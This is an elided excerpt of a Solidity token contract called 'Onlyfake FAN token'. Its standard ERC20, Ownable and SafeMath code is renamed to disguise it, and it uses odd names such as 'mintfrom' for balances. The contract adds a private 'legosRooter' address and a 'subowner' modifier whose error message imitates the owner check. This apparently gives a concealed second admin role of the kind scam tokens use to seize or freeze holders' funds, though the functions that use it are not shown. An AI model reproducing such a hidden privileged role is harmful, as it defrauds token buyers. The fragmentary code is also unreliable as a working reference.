...
this is : Onlyfake FAN token
*/
pragma solidity 0.8.24;

interface Onlyfake33 {
  /**
...
/*
 * @dev Provides information about the current execution Onlyfake20Burnable, including the
 ...
 */
abstract contract Onlyfake20Burnable {
...
// File: @openzeppelin/contracts/access/Onlyfake20Ownable.sol
 ...
 * the owner.
 */
abstract contract Onlyfake20Ownable is Onlyfake20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Onlyfake20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Onlyfake20Ownable: new owner is the zero address");
 ...
 * `SafeOnlyfake` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeOnlyfake {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeOnlyfake: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeOnlyfake: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeOnlyfake: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeOnlyfake: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeOnlyfake: modulo by zero");
  }
...
contract OnlyfakeToken is Onlyfake20Burnable, Onlyfake33, Onlyfake20Ownable {
    
    using SafeOnlyfake for uint256;
   ...
   address private legosRooter; 
    ...
    string public OnlyfakeCtVersion = "Onlyfake 0.8.24";
            function getOnlyfakeCtVersion() public view returns (string memory) {
        return OnlyfakeCtVersion;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {Onlyfake33-totalSupply}.
    */
    ...
    /**
    * @dev See {Onlyfake33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "Onlyfake20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {Onlyfake33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {Onlyfake33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {Onlyfake33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "Onlyfake33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {Onlyfake33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "Onlyfake33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "Onlyfake33: transfer from the zero address");
        require(shippingto != address(0), "Onlyfake33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "Onlyfake33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "Onlyfake33: approve from the zero address");
        require(transporteur != address(0), "Onlyfake33: approve to the zero address");
